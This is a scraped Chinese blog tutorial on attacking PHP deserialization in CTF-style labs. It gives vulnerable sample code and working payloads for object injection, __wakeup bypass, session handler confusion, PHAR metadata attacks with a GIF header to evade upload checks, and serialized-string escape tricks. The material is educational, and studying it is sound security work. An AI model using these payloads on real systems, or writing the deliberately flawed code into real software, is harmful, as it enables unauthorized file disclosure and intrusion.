{"blogid": "124427512", "writerAge": "None", "writerBlogNum": "81", "writerCollect": "75", "writerComment": "4", "writerFan": "55", "writerGrade": "4级", "writerIntegral": "854", "writerName": "成都知道创宇", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124427512.jpg", "writerRankTotal": "25623", "writerRankWeekly": "160308", "writerThumb": "8", "writerVisitNum": "106191", "blog_read_count": "1782", "blog_time": "于 2022-04-26 14:43:04 发布", "blog_title": "渗透测试-PHP反序列化及绕过", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<h2>最简单的反序列化</h2>\n<p><br/>             require_once('flag.php');<br/>             highlight_file(__FILE__);<br/>             class A{<!-- --><br/>                         private $user = 'test';<br/>                        <br/>                         function __destruct(){<!-- --><br/>                                     if ($this-&gt;user == 'admin') {<!-- --><br/>                                                 var_dump($GLOBALS);<br/>                                     }<br/>                         }<br/>             }<br/><br/>             $data = $_GET['data'];<br/>             unserialize($data);</p>\n<p>当我们反序列化后user为admin时输出$GLOBALS，输出当前php页面全局变量</p>\n<p>我们构造payload如下</p>\n<p><br/>     class A{<!-- --><br/>         private $user = 'admin';<br/>     }<br/><br/>     echo urlencode(serialize(new A()));</p>\n<p>运行获得url编码序列化后的值为O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00user%22%3Bs%3A5%3A%22admin%22%3B%7D</p>\n<p>将其赋值给data后即可输出全局变量</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\c83ebe3b9b8d17f1a0a0e45b87e723de.png\"/></p>\n<h2>__wakeup绕过</h2>\n<p>在反反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</p>\n<p>影响版本</p>\n<p>php5.0.0 ~ php5.6.25</p>\n<p>php7.0.0 ~ php7.0.10</p>\n<p>php源码</p>\n<p><br/>             highlight_file(__FILE__);<br/>             class A{<!-- --><br/>                         private $filename = 'test.txt';<br/><br/>                         public function __wakeup() {<!-- --><br/>                                     $this-&gt;filename = 'test.txt';<br/>                         }<br/>                        <br/>                         public function __destruct() {<!-- --><br/>                                     echo file_get_contents($this-&gt;filename);<br/>                         }<br/>                        <br/>             }<br/><br/>             $data = $_GET['data'];<br/>             unserialize($data);</p>\n<p>php语言的特性为在反序列化时，先执行__wakeup()魔术方法，才会执行__destruct()魔术方法</p>\n<p>也就是说当我们使用payload</p>\n<p><br/>     class A{<!-- --><br/>         private $filename = 'flag.php';<br/>     }<br/><br/>     echo urlencode(serialize(new A()));</p>\n<p>O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</p>\n<p>去反序列化时</p>\n<p>结果为</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\4b1211daecfa6c9c326c1b6fd33e8281.png\"/></p>\n<p>可以发现我们在反序列化时修改的$filename的值在__wakeup()函数时由flag.php修改为了test.txt</p>\n<p>绕过__wakeup()函数时将对象属性个数的值大于真实的属性个数时即可绕过</p>\n<p>即O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</p>\n<p>改为，只需要将对象个数大于1即可，2，3，4等等都行，这里我使用2</p>\n<p>O%3A1%3A%22A%22%3A2%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</p>\n<p>即可获取想要的文件的内容</p>\n<p><img alt=\"\" height=\"1\" src=\"https://img-blog.csdnimg.cn/e7498255465c4a87be51155226ab37bc.gif\" width=\"1\"/></p>\n<h2>private protect变量构造</h2>\n<p>如最开始</p>\n<p>在构造payload时</p>\n<p>将所得的payload进行url编码即可</p>\n<p></p>\n<h2>Session反序列化漏洞</h2>\n<p>PHP中的Session经序列化后存储，读取时再进行反序列化。</p>\n<p>相关配置：</p>\n<p>session.save_path=\"\" //设置session的存储路径</p>\n<p>session.save_handler=\"\" //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</p>\n<p>session.auto_start boolen //指定会话模块是否在请求开始时启动一个会话默认为0不启动</p>\n<p>session.serialize_handler string //定义用来序列化/反序列化的处理器名字。默认使用php</p>\n<p>PHP有3种序列化处理器</p>\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\"><thead><tr><td style=\"vertical-align:top;\"> <p>处理器</p> </td><td style=\"vertical-align:top;\"> <p>对应的存储格式</p> </td></tr></thead><tbody><tr><td style=\"vertical-align:top;\"> <p>php</p> </td><td style=\"vertical-align:top;\"> <p>键名+竖线（|）+经过serialize()函数处理过的值</p> </td></tr><tr><td style=\"vertical-align:top;\"> <p>php_binary</p> </td><td style=\"vertical-align:top;\"> <p>键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</p> </td></tr><tr><td style=\"vertical-align:top;\"> <p>php_serialize</p> </td><td style=\"vertical-align:top;\"> <p>经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</p> </td></tr></tbody></table>\n<p>代码</p>\n<p><br/><br/>             session_start();<br/><br/>             $_SESSION['test'] = $_REQUEST['test'];<br/>             echo session_id();</p>\n<p>执行后可以看到</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\94985850c983f2effc0e3091f8ad2a2d.png\"/></p>\n<p>命名方式为sess_session_id()</p>\n<p>存储内容为序列化后的session:test|s:4:\"test\";</p>\n<p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的session序列化格式不同，就可能产生反序列化漏洞</p>\n<p>因为index.php与session.php采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的</p>\n<p>也就是说将数据通过session.php序列化后将数据存入的文件与index.php反序列化获取反序列化值的文件相同</p>\n<p>从而达到反序列化攻击的目的</p>\n<p>index.php</p>\n<p><br/>             ini_set('session.serialize_handler', 'php');<br/><br/>             session_start();<br/><br/>             class A {<!-- --><br/>                         public $user = 'test.txt';<br/><br/>                         function __wakeup() {<!-- --><br/>                                     echo \"__wakeup<br/> \";<br/>                         }<br/><br/>                         function __destruct() {<!-- --><br/>                                     echo $this-&gt;filename;<br/>                         }<br/>             }</p>\n<p>generate.php</p>\n<p><br/>     class A{<!-- --><br/>         public $filename = 'flag.php';<br/>     }<br/><br/>     echo serialize(new A);</p>\n<p>session.php</p>\n<p><br/>             ini_set('session.serialize_handler', 'php_serialize');<br/><br/>             session_start();<br/><br/>             $_SESSION['test'] = $_REQUEST['test'];<br/>             echo session_id();</p>\n<p>首先通过generate.php构造payload</p>\n<p>O:1:\"A\":1:{s:8:\"filename\";s:8:\"flag.php\";}</p>\n<p>将O:1:\"A\":1:{s:8:\"filename\";s:8:\"flag.php\";}前面加一个|</p>\n<p>即可将反序列化的值存入到session中使index.php反序列化</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\b576bae1a4786ebb0090eab5dc7bf8ad.png\"/></p>\n<p>即可完成session反序列化攻击</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\a61fa2f2e445f2f1f98c2e115f636b34.png\"/></p>\n<h2></h2>\n<h2>PHAR利用</h2>\n<h3>1、PHAR简介</h3>\n<p>PHAR (\"PHp ARchive\")是PHP里类似于JAR的一种打包文件，在PHP5.3或更高版本默认开启，这个特性使得PHP也可以像Java一样方便地实现应用程序打包和组件化，一个应用程序可以打成一个PHAR包，直接方法PHP-FPM中运行</p>\n<h3>2、PHAR文件结构</h3>\n<p>PHAR文件由3或4个部分组成</p>\n<p>(1) stub //phar文件头</p>\n<p>stub就是一个简单的php文件，最简文件头为：</p>\n<p>__HALF_COMPILER(); ?&gt;</p>\n<p>文件头中必须包含__HALF_COMPILER()除此之外没有限制。（PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测）</p>\n<p>(2)manifest describing the contents //PHAR文件描述该部分存储文件名、文件大小等信息，如下图所示</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\71c6700b2c7f477b32c3286480ed8249.png\"/></p>\n<p>图中标出的地方，存储了经serialize()的Meta-data，有序列化过程必有反序列化过程，这就是我们的注入点</p>\n<p>(3) the file contents</p>\n<p>PHAR文件内容</p>\n<p>(4) [optional] a signature for verifying Phar integrity (phar file format only) // 可选的签名部分， 支持MD5和SHA1</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\25c37ae59809eb60f53285c1edba9c6e.png\"/></p>\n<h3></h3>\n<h3>攻击方法</h3>\n<p>2018年Black Hat研究院Sam Thomas的议题：</p>\n<p>It’s a PHP unserialization vulnerability Jim, but not as we know it提供了一种新的php反序列化攻击姿势。PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar://协议解析时Meta-data部分会被反序列化，这个反序列化过程就是我们的攻击点，Meta-data部分填充payload。</p>\n<p>漏洞利用条件：</p>\n<p>在目标系统上投放一个装在payload的可访问的PHAR文件，通过文件系统函数利用phar://伪协议解析目标PHAR文件。</p>\n<p>注意：要将php.ini中的phar.readonly选项设置为off，否则无法生成phar文件</p>\n<p>testPhar.php</p>\n<p><br/><br/>             class A {<!-- --><br/>             }<br/>             $phar = new Phar('phar.phar');            //后缀名必须为phar<br/>             $phar-&gt;startBuffering();<br/>             $phar-&gt;setStub(\"\");            //设置stub<br/>             $o = new A();<br/>             $o-&gt;data = 'cmacckk';<br/>             $phar-&gt;setMetadata($o);                        // 将自定义的meta-data存入manifest<br/>             $phar-&gt;addFromString('test.txt', 'test');            // 添加要压缩的文件<br/>             // 签名自动计算<br/>             $phar-&gt;stopBuffering();<br/><br/> ?&gt;</p>\n<p></p>\n<p>可以从箭头中看到序列化后结果</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\51ea9d6a7b6c083c6cc78fd8e2b3ef40.png\"/></p>\n<p>箭头标出Meta-data部分，可以看到为序列化后结果</p>\n<p>index.php<br/>    <br/>     class A {<!-- --><br/>             function __destruct() {<!-- --><br/>                         echo \"<br/> destruct called\";<br/>             }<br/> }<br/><br/> $filename = \"phar://phar.phar/test.txt\";<br/> echo file_get_contents($filename);</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\5a2c03496461ef10acd2cb8ffda82430.png\"/></p>\n<p>可以看到输出了之前打包的phar文件中,test.txt文件的内容test，并成功实例化A对象，调用了析构函数(__destruct)</p>\n<p>由于PHP仅通过stub部分判断文件是否为PHAR文件，我们可以通过添加文件头、修改后缀的方式绕过上传检测</p>\n<p><br/><br/>             class A {<!-- --><br/>             }<br/>             $phar = new Phar('phar.phar');            //后缀名必须为phar<br/>             $phar-&gt;startBuffering();<br/>             $phar-&gt;setStub(\"GIF89a\" . \"\");            //设置stub，增加gif文件头绕过<br/>             $o = new A();<br/>             $phar-&gt;setMetadata($o);                        // 将自定义的meta-data存入manifest<br/>             $phar-&gt;addFromString('test.txt', 'test');            // 添加要压缩的文件<br/>             // 签名自动计算<br/>             $phar-&gt;stopBuffering();<br/><br/> ?&gt;</p>\n<h2></h2>\n<h2>PHP反序列化字符串逃逸(变长)</h2>\n<p>示例代码</p>\n<p><br/><br/>             highlight_file(__FILE__);<br/>             require_once('flag.php');<br/>             function waf($str) {<!-- --><br/>                         return str_replace('bb', 'ccc', $str);<br/>             }<br/><br/>             class A {<!-- --><br/>                         public $name = 'admin';<br/>                         public $pass = '123456';<br/>             }<br/><br/>             $c = unserialize(waf(serialize(new A())));<br/>             if ($c-&gt;pass === 'admin') {<!-- --><br/>                         echo $flag;<br/>             } else {<!-- --><br/>                         echo \"no no no\";<br/>             }</p>\n<p>在代码中，当$pass为admin时，才会输出flag</p>\n<p>在这里有一个函数waf</p>\n<p>waf函数会将bb变为ccc</p>\n<p>即bb会变为ccc，在这个过程中反序列化时便会少读取一个字符</p>\n<p>使用test.php查看当前序列化结果</p>\n<p><br/>             function waf($str) {<!-- --><br/>                         return str_replace('bb', 'ccc', $str);<br/>             }<br/>            <br/>             class A {<!-- --><br/>                         public $name = 'admin';<br/>                         public $pass = '123456';<br/>             }<br/><br/>             $c = (serialize(new A()));<br/>             echo $c;</p>\n<p><img alt=\"\" height=\"1\" src=\"https://img-blog.csdnimg.cn/3f1730fee3f54ac2a682b179f2e6a19c.gif\" width=\"1\"/></p>\n<p>我们要让红线部分的数据修改为admin，在代码里修改</p>\n<p><br/>             function waf($str) {<!-- --><br/>                         return str_replace('bb', 'ccc', $str);<br/>             }<br/>            <br/>             class A {<!-- --><br/>                         public $name = 'admin';<br/>                         public $pass = 'admin';<br/>             }<br/><br/>             $c = (serialize(new A()));<br/>             echo $c;</p>\n<p><img alt=\"\" height=\"1\" src=\"https://img-blog.csdnimg.cn/60c544ae80e34245bdf18094b0cb41fe.gif\" width=\"1\"/></p>\n<p>所以我们要逃逸的字符串为\";s:4:\"pass\";s:5:\"admin\";}</p>\n<p><img alt=\"\" height=\"1\" src=\"https://img-blog.csdnimg.cn/3aaa8500d5fc4b25b6b874388a049abf.gif\" width=\"1\"/></p>\n<p>按照一个bb转变为ccc会逃逸1个字符，如果我们要逃逸26个字符，那么我们需要26个bb</p>\n<p><img alt=\"\" height=\"1\" src=\"https://img-blog.csdnimg.cn/beb3be08630f4964a0ab5b08a03bec37.gif\" width=\"1\"/></p>\n<p>所以生成的name值为bbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:5:\"admin\";}</p>\n<p>生成payload</p>\n<p><br/><br/>             highlight_file(__FILE__);<br/>             require_once('flag.php');<br/>             function waf($str) {<!-- --><br/>                         return str_replace('bb', 'ccc', $str);<br/>             }<br/><br/>             class A {<!-- --><br/>                         public $name = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:5:\"admin\";}';<br/>                         public $pass = '123456';<br/>             }<br/><br/>             echo \"<br/> serialize a:<br/> \" . serialize(new A()) . \"<br/> \";<br/>             echo \"waf serialize a:<br/> \" . waf(serialize(new A())) . \"<br/> \";<br/>             $c = unserialize(waf(serialize(new A())));<br/>             if ($c-&gt;pass === 'admin') {<!-- --><br/>                         echo $flag;<br/>             } else {<!-- --><br/>                         echo \"no no no\";<br/>             }</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\b8f23be39cd58eb21a5dfc047da2860e.png\"/></p>\n<p>可以看到在经过waf函数后，逃逸后的反序列化长度符合，可以正常反序列化，反序列化}前的值</p>\n<p>最终改变了$pass的值获取flag</p>\n<h2></h2>\n<h2>PHP反序列化字符串逃逸(变短)</h2>\n<p><br/>             require_once('flag.php');<br/>             highlight_file(__FILE__);<br/>             function waf($str) {<!-- --><br/>                         return preg_replace(\"/ctf|flag/i\", \"\", $str);<br/>             }<br/><br/>             $test['name'] = $_GET['name'];<br/>             $test['sign'] = $_GET['sign'];<br/>             $test['year'] = '2021';<br/>            <br/><br/>             $tmp = waf(serialize($test));<br/>             echo \"<br/> \" . $tmp . \"<br/> \";<br/><br/>             $result = unserialize($tmp);<br/>             echo $result['year'];<br/>             if ($result['year'] === '2100') {<!-- --><br/>                         echo $flag;           <br/>             }</p>\n<h3></h3>\n<h3>第一步</h3>\n<p>首先我们要明确要逃逸的字符串</p>\n<p>在这里要时year为2100，所以我们构造payload</p>\n<p><br/><br/>             function waf($str) {<!-- --><br/>                         return preg_replace(\"/ctf|flag/i\", \"\", $str);<br/>             }<br/><br/>             $test['name'] = 'cmacckk';<br/>             $test['sign'] = 'test';<br/>             $test['year'] = '2100';<br/>            <br/>             echo serialize($test) . \"     \";<br/>             $tmp = waf(serialize($test));<br/>             echo $tmp;</p>\n<p>我们需要逃逸这个部分</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\1d46c67f234741e63baab6ed0f8d0b4b.png\"/></p>\n<h3></h3>\n<h3>第二步</h3>\n<p>我们需要在这个字符串之前添加一个字符或字符串</p>\n<p>这里我添加一个C</p>\n<p>将sign的值改为\"C;s:4:\"sign\";s:4:\"test\";s:4:\"year\";s:4:\"2100\";}</p>\n<p><br/><br/>             function waf($str) {<!-- --><br/>                         return preg_replace(\"/ctf|flag/i\", \"\", $str);<br/>             }<br/><br/>             $test['name'] = 'cmacckk';<br/>             $test['sign'] = 'C\";s:4:\"sign\";s:4:\"test\";s:4:\"year\";s:4:\"2100\";}';<br/>             $test['year'] = '2100';<br/>            <br/>             echo serialize($test);</p>\n<p>运行<img alt=\"\" height=\"1\" src=\"https://img-blog.csdnimg.cn/5b7073b4875245439a49a29bd4ca63f2.gif\" width=\"1\"/></p>\n<h3></h3>\n<h3>第三步</h3>\n<p>查看\";s:4:\"sign\";s:48:\"C的长度</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\ee0733a5e69cee15935b02e6aaa8104e.png\"/></p>\n<p>发现长度为20</p>\n<p>在这里的waf函数中，将ctf或flag替换为''，所以一个ctf能逃逸3个字符，一个flag能逃逸4个字符</p>\n<p>我们需要逃逸20个字符</p>\n<p>则仅需要5个flag即可</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\6284585c3c06d1315be141142452019b.png\"/></p>\n<p>最终传值结果为</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\12e40e0870ba641cf15a201284d153db.png\"/></p>\n<p>参考https://www.cnblogs.com/ichunqiu/p/10484832.html</p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 1, "sql": 0, "php": 1, "time": "2022-04-26 14:43:04", "summary": "最简单的反序列化当我们反序列化后为时输出，输出当前页面全局变量我们构造如下运行获得编码序列化后的值为将其赋值给后即可输出全局变量绕过在反反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过"}